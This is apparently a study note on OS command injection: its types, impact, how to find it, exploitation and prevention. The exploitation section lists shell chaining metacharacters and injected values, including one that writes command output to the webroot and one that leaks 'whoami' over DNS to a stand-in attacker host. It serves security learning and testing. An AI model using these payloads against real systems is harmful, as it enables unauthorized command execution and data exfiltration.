# Command Injection

Command Injection is a vulnerability in which an attacker manages to execute OS commands on the host though the application.

OWASP Top 10 - A3 - Injection.

### Types of Command Injection

- In-Band (result of the command returned to attacker).
- Blind (output not returned).

### Impact

- Confidentiality: Can be used to view sensitive information.
- Integrity: Can be used to alter content in the application.
- Availability: Can be used to delete content in the application.

Remote code execution.

## Locating Command Injection

### Black Box

- Map the application and note instances where the application appears to be interacting with the underlying operating system.
- Fuzz the application with command injection payloads: `&`, `&&`, `|`, `||`, `;`, etc.
- For in-band command injections, analyze the response to determine if it's vulnerable.
- For blind command injection, try to trigger a time delay using the `ping` or `sleep` command. Exfiltrate data by outputing the result of the command in the webroot directory and retrieving the file in the browser or by opening an out-of-band channel to a server you control.

### White box

- Map all input vectors and determine if any are added as parameters to functions that execute system commands.
- Once a vulnerability is identified, test it to confirm it is actually exploitable.

## Exploitation

- In-Band: use shell metacharacters to concatenate another command to the command being run:

```bash
& && | || ; \n ` $()
```

- Blind: Trigger a time delay using either the `sleep` or `ping` command. Output the result of a command to the webroot e.g. `127.0.0.1 & whoami > /var/www/static/whoami.txt &`. Open an out-of-band channel back to a server you control: `` 127.0.0.1 & nslookup `whoami`.kub34d1us.web-attacker.com & ``.

# Prevention

- Avoid calling OS commands directly or use built-in library functions that only perform the specific task you need (e.g. mkdir() instead of system("mkdir /dir_name").
- Validate against a whitelist of permitted values.
